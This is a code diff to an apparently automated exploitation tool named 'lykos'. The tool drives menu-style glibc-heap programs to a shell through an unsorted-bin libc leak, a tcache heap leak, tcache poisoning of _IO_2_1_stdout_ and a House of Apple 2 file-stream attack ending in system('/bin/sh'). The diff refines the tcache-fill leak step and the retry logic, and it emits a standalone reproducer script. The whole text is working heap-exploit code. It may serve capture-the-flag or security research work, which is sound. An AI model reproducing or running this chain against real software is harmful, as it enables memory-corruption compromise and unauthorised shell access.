@@ -1836,7 +1836,8 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
 
 def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, system_off,
                        poison_size=0x300, guard_size=0x430, width=None,
-                       strategy="large-chunk", fill_size=0x100, fill_max=24) -> bytes:
+                       strategy="large-chunk", fill_size=0x100, fill_max=20,
+                       fill_slots=None) -> bytes:
     """A self-contained, stdlib-based reproducer for the automated glibc-heap -> shell chain
     (unsorted-bin libc leak -> tcache-fd heap leak -> tcache poison of _IO_2_1_stdout_ -> House of
     Apple 2 -> system("/bin/sh")). ASLR-dependent, so no static input can exist -- the libc base and
@@ -1855,7 +1856,7 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         f"UNSORTED_OFF={unsorted_off:#x}; STDOUT_OFF={stdout_off:#x}; "
         f"WFILE_JUMPS_OFF={wfile_jumps_off:#x}; SYSTEM_OFF={system_off:#x}\n"
         f"POISON={poison_size:#x}; GUARD={guard_size:#x}\n"
-        f"STRATEGY={strategy!r}; FILL={fill_size:#x}; FILLMAX={int(fill_max)}\n"
+        f"STRATEGY={strategy!r}; FILL={fill_size:#x}; FILLSLOTS={int(fill_slots or fill_max)}\n"
         "SIZES={}\n"
         "def render(t, idx=None, size=None, data=b'', dsize=None):\n"
         "    def sub(s):\n"
@@ -1916,9 +1917,11 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "base=None; off=0; PB=2\n"
         "if STRATEGY=='tcache-fill':   # size-capped notebook: fill the bin until a chunk spills out\n"
         "    PB=0\n"
-        "    for i in range(FILLMAX+1): op(ADD(i,FILL,b'A'))\n"
-        "    for i in range(FILLMAX):\n"
-        "        op(FREE(i)); vo=op(VIEW(i),0.45)\n"
+        "    n=FILLSLOTS   # measured when this exploit was built; never probe past the table (a\n"
+        "    assert n>=3, 'slot table too small (%d)'%n   # refused add desyncs the menu and exits)\n"
+        "    for i in range(n): op(ADD(i,FILL,b'A'))\n"
+        "    for i in list(range(1,n))+[0]:   # lowest LAST: the spilling chunk must not border the\n"
+        "        op(FREE(i)); vo=op(VIEW(i),0.45)   # top chunk, or it consolidates instead of linking\n"
         "        for o,v in windows(vo):\n"
         "            b=binhead(v)\n"
         "            if b: base,off=b,o; break\n"
@@ -1954,7 +1957,7 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
 # --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
 def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
                        poison_size=0x300, guard_size=0x430, fill_size=0x100, use_fill=False,
-                       marker=b"LYKOS-HEAP-9931",
+                       fill_slots=None, marker=b"LYKOS-HEAP-9931",
                        timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
     """Drive a menu-style glibc-heap target to a shell, fully automatically, via tcache poisoning +
     House of Apple 2. Composes the pieces lykos already has (menu model, safe-linking, FSOP):
@@ -2041,22 +2044,40 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
                 return b, i, 2
         return None, 0, 0
 
-    def _leak_libc_fill(fill_size, max_fill=24):
+    def _leak_libc_fill(fill_size, max_slots=20):
         """Size-capped notebook: the large request above is refused, so FILL the tcache bin for a
         permitted size and keep freeing until one chunk no longer fits it and links into a main_arena
-        bin head. The capacity is discovered by viewing each freed chunk rather than assumed (7 on
-        older glibc, 16 on 2.43), so this needs no per-version constant. `fill_size` must be above
-        the fastbin ceiling (a fastbin fd is a heap pointer, never libc); the caller picks it."""
-        for i in range(max_fill + 1):                # the last allocation guards the top chunk
-            _op(add(i, fill_size, b"A"))
-        for i in range(max_fill):
+        bin head. The bin's capacity is DISCOVERED by viewing each freed chunk rather than assumed (7
+        on older glibc, 16 on 2.43), so this needs no per-version constant. `fill_size` must be above
+        the fastbin ceiling (a fastbin fd is a heap pointer, never libc); the caller picks it.
+
+        Needs `capacity + 1` slots and no more. Two things keep it inside a SMALL notebook's table:
+
+          * The slot count is discovered, not assumed: every allocation is VERIFIED by viewing its
+            tag back, and the fill stops at the real end of the table. Finding that end COSTS the
+            process -- the refused add leaves its data unread, which desyncs the menu and exits the
+            target -- so the count is reported back and the caller replays the fill with
+            `fill_slots` set, where nothing is ever allocated past the table.
+          * The lowest slot is freed LAST, so the chunk that spills is never the one adjacent to the
+            top chunk -- that one would consolidate into the top instead of linking into a bin. That
+            removes the separate guard allocation an earlier version needed."""
+        n = 0
+        for i in range(fill_slots or max_slots):
+            tag = b"S%04d" % i
+            _op(add(i, fill_size, tag))
+            if fill_slots is None and tag not in _op(view(i), 0.3):
+                break                                    # end of the table (this process is now dead)
+            n = i + 1
+        if n < 3:                                    # too small to even hold the poison trio
+            return None, 0, n
+        for i in list(range(1, n)) + [0]:
             _op(free(i))
             vout = _op(view(i), 0.45)
             for off, v in _windows(vout):
                 b = _bin_head_base(v)
                 if b:
-                    return b, off, i + 1
-        return None, 0, 0
+                    return b, off, n
+        return None, 0, n
 
     try:
         _read_until(p, time.time() + 0.5)
@@ -2065,9 +2086,10 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
         #    heap leak below reuses as calibration.
         base, data_off, used = (_leak_libc_fill(fill_size) if use_fill else _leak_libc_large())
         if not base:
-            return {"ok": False,
-                    "reason": (f"libc leak failed (tcache-fill at {fill_size:#x} disclosed no bin "
-                               "head)" if use_fill else
+            return {"ok": False, "slots": used,
+                    "reason": (f"libc leak failed (tcache-fill at {fill_size:#x} over {used} usable "
+                               "slots disclosed no bin head; the bin needs capacity+1 distinct "
+                               "chunks, so a smaller table cannot spill)" if use_fill else
                                f"libc leak failed (no bin head from a {guard_size:#x} chunk -- a "
                                "size cap would refuse it)")}
         # Poison slots. The large path allocated indices 0-1, so start past them. The fill path left
@@ -2118,7 +2140,7 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
             return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
         out = _read_until(p, time.time() + timeout, quiet=1.5)
         if marker in out:
-            return {"ok": True, "libc_base": base, "heap_page": heap_page,
+            return {"ok": True, "libc_base": base, "heap_page": heap_page, "slots": used,
                     "stdout": stdout_addr, "fill_size": fill_size if use_fill else None,
                     "strategy": "tcache-fill" if use_fill else "large-chunk",
                     "output": out[:400].decode("latin-1", "ignore")}
@@ -2161,6 +2183,15 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
     if res.get("ok") or "libc leak failed" not in str(res.get("reason", "")):
         return res
     res2 = _heap_fsop_attempt(exe, workdir, use_fill=True, **kw)
+    # Probing for the end of a SMALL slot table costs that process (the refused add desyncs the menu
+    # and exits the target), so if the fill discovered a table shorter than it probed, replay it with
+    # the count now known -- that run allocates only real slots and keeps its process alive.
+    slots = res2.get("slots") or 0
+    if not res2.get("ok") and 3 <= slots < 20:
+        res3 = _heap_fsop_attempt(exe, workdir, use_fill=True, fill_slots=slots, **kw)
+        if res3.get("ok"):
+            return res3
+        res2 = res3
     if not res2.get("ok"):
         res2["reason"] = f"{res.get('reason')}; then {res2.get('reason')}"
     return res2
